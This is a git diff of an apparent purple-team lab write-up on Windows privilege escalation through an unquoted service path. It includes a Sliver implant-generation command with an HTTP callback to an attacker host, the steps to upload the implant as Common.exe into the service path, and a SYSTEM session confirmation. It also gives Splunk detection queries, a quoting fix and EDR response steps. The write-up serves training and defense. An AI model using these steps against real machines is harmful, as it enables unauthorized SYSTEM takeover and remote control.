@@ -6,13 +6,13 @@ Objective
 Escalate privileges from a Standard User (Medium Integrity) to NT AUTHORITY\SYSTEM (High Integrity).
 
 Our current privilege:
+
 <p align="center">
   <img src="images/normal.png">
 </p>
 <p align="center">
-  <em>Figure 1:Standard user with low level privilege.</em>
+  <em>Figure 1: Standard user operating with medium integrity privileges.</em>
 </p>
-
 
 MITRE ATT&CK Mapping  
 - Tactic: TA0004 – Privilege Escalation  
@@ -29,14 +29,18 @@ Passive trigger (“plant and wait”) — abusing normal Windows behavior inste
 
 The Windows service VulnService was configured with an unquoted executable path containing spaces:
 
-    C:\Program Files\Vulnerable Service\Common Files\Target.exe
+```
+C:\Program Files\Vulnerable Service\Common Files\Target.exe
+```
 
 Because the path is unquoted, Windows resolves executables in the following order:
 
-    C:\Program.exe
-    C:\Program Files\Vulnerable.exe
-    C:\Program Files\Vulnerable Service\Common.exe
-    C:\Program Files\Vulnerable Service\Common Files\Target.exe
+```
+C:\Program.exe
+C:\Program Files\Vulnerable.exe
+C:\Program Files\Vulnerable Service\Common.exe
+C:\Program Files\Vulnerable Service\Common Files\Target.exe
+```
 
 If an attacker can write to any of these locations, execution can be hijacked.
 
@@ -66,7 +70,9 @@ Purpose: Enumerate privilege escalation vectors
 
 Command:
 
-    winpeas.exe quiet servicesinfo
+```
+winpeas.exe quiet servicesinfo
+```
 
 Observation:
 - VulnService2 flagged in red
@@ -75,23 +81,26 @@ Observation:
 
 Vulnerable Binary Path:
 
-    C:\Program Files\Vulnerable Service\Common Files\Target.exe
+```
+C:\Program Files\Vulnerable Service\Common Files\Target.exe
+```
 
 <p align="center">
   <img src="images/winpeas.png">
 </p>
 <p align="center">
-  <em>Figure 1:WinPEAS output highlighting the unquoted service path in red</em>
+  <em>Figure 2: WinPEAS output highlighting the unquoted service path.</em>
 </p>
 
-The service from windows:
+The service configuration from Windows:
 
 <p align="center">
   <img src="images/service.png">
 </p>
 <p align="center">
-  <em>Figure 1:Vulnerable Service</em>
+  <em>Figure 3: Vulnerable Windows service configuration.</em>
 </p>
+
 ---
 
 ### Step 2: Weaponization — Service-Compatible Payload
@@ -101,20 +110,21 @@ Payload generated in Windows service format to ensure stable execution under SCM
 
 Command:
 
-    generate --http 192.168.1.101:80 \
-      --os windows \
-      --arch amd64 \
-      --format service \
-      --name CommonSvc \
-      --save /home/kali/Comm
+```
+generate --http 192.168.1.101:80 \
+  --os windows \
+  --arch amd64 \
+  --format service \
+  --name CommonSvc \
+  --save /home/kali/Comm
+```
 
 <p align="center">
   <img src="images/payload.png">
 </p>
 <p align="center">
-  <em>Figure 1:Sliver payload generation command and successful output</em>
+  <em>Figure 4: Sliver payload generation and successful output.</em>
 </p>
-
 
 ---
 
@@ -124,25 +134,28 @@ Payload renamed to Common.exe to match the path interception breakpoint.
 
 Target directory:
 
-    C:\Program Files\Vulnerable Service\
+```
+C:\Program Files\Vulnerable Service\
+```
 
 Upload command:
 
-    upload /home/kali/Common.exe "C:\\Program Files\\Vulnerable Service\\Common.exe"
+```
+upload /home/kali/Common.exe "C:\\Program Files\\Vulnerable Service\\Common.exe"
+```
 
 <p align="center">
   <img src="images/upload.png">
 </p>
 <p align="center">
-  <em>Figure 1: Upload command.</em>
+  <em>Figure 5: Payload upload command.</em>
 </p>
-
 
 <p align="center">
   <img src="images/landed.png">
 </p>
 <p align="center">
-  <em>Figure 1:File successfully uploaded in the vulnerable directory (Explorer or CLI)</em>
+  <em>Figure 6: Payload successfully placed in the vulnerable directory.</em>
 </p>
 
 ---
@@ -161,16 +174,16 @@ Instead of forcing a service restart:
   <img src="images/service.png">
 </p>
 <p align="center">
-  <em>Figure 1: Service information</em>
+  <em>Figure 7: Service execution during system startup.</em>
 </p>
 
-System Behavior: Upon startup, the Windows Service Control Manager (SCM) automatically executed Common.exe with SYSTEM privileges. 
+System Behavior: Upon startup, the Windows Service Control Manager (SCM) automatically executed Common.exe with SYSTEM privileges.
 
 <p align="center">
   <img src="images/C2.png">
 </p>
 <p align="center">
-  <em>Figure 1: C2 established.</em>
+  <em>Figure 8: Command-and-Control channel established.</em>
 </p>
 
 ---
@@ -181,19 +194,22 @@ A new Sliver session checked in automatically after execution.
 
 Verification:
 
-    whoami
+```
+whoami
+```
 
 Result:
 
-    NT AUTHORITY\SYSTEM
+```
+NT AUTHORITY\SYSTEM
+```
 
 <p align="center">
   <img src="images/SYSTEM.png">
 </p>
 <p align="center">
-  <em>Figure 1: Sliver C2 session and whoami output confirming SYSTEM access.</em>
+  <em>Figure 9: SYSTEM-level access confirmed via Sliver session.</em>
 </p>
-
 
 ---
 
@@ -210,16 +226,15 @@ Sysmon Event ID 11 (File Create)
 
 Query:
 
-    index=windows EventCode=11
-    (TargetFilename="*\\Program.exe" OR TargetFilename="*\\Common.exe")
-    NOT User="NT AUTHORITY\\SYSTEM"
+```
+index=windows EventCode=11
+(TargetFilename="*\\Program.exe" OR TargetFilename="*\\Common.exe")
+NOT User="NT AUTHORITY\\SYSTEM"
+```
 
 Why this works:
 - Standard users writing executables to Program Files is abnormal
 - File names align with known unquoted path breakpoints
-
-SCREENSHOT REQUIRED:
-- Splunk event showing suspicious file creation
 
 ---
 
@@ -229,10 +244,12 @@ Sysmon Event ID 1 (Process Create)
 
 Query:
 
-    index=windows EventCode=1
-    Image="*\\Common.exe"
-    ParentImage="*\\services.exe"
-    IntegrityLevel="System"
+```
+index=windows EventCode=1
+Image="*\\Common.exe"
+ParentImage="*\\services.exe"
+IntegrityLevel="System"
+```
 
 Why this matters:
 - services.exe should only launch legitimate service binaries
@@ -241,14 +258,12 @@ Why this matters:
 <p align="center">
   <img src="images/process.png">
 </p>
-<p align="center">
-
 
 <p align="center">
   <img src="images/process2.png">
 </p>
 <p align="center">
-  <em>Figure 1:Splunk process creation event showing SYSTEM-level execution</em>
+  <em>Figure 10: Splunk process creation events confirming SYSTEM execution.</em>
 </p>
 
 ---
@@ -267,7 +282,9 @@ Remediation Steps:
 
 2. Patch  
 
-        sc config "VulnService" binPath= "\"C:\Program Files\Vulnerable Service\Common Files\Target.exe\""
+```
+sc config "VulnService" binPath= "\"C:\Program Files\Vulnerable Service\Common Files\Target.exe\""
+```
 
 3. Clean  
    - Remove malicious binary from disk
@@ -291,16 +308,15 @@ Observed Telemetry:
 - User Context: NT AUTHORITY\SYSTEM
 - Parent Process: services.exe
 
-Assessment:
+Assessment:  
 Execution of an unsigned binary from a user-writable directory under SYSTEM context strongly indicates service binary hijacking via unquoted service path abuse.
 
 <p align="center">
   <img src="images/edr.png">
 </p>
 <p align="center">
-  <em>Figure 1:LimaCharlie timeline showing services.exe spawning Common.exe</em>
+  <em>Figure 11: LimaCharlie timeline showing services.exe spawning Common.exe.</em>
 </p>
-- 
 
 ---
 
@@ -311,9 +327,6 @@ Status: ACTIVE THREAT — ISOLATION IN PROGRESS
 Immediate Actions:
 - Network Isolation: segregate_network
 - Process Termination: os_kill_process on Common.exe
-
-SCREENSHOT REQUIRED:
-- LimaCharlie response actions successfully executed
 
 ---
 
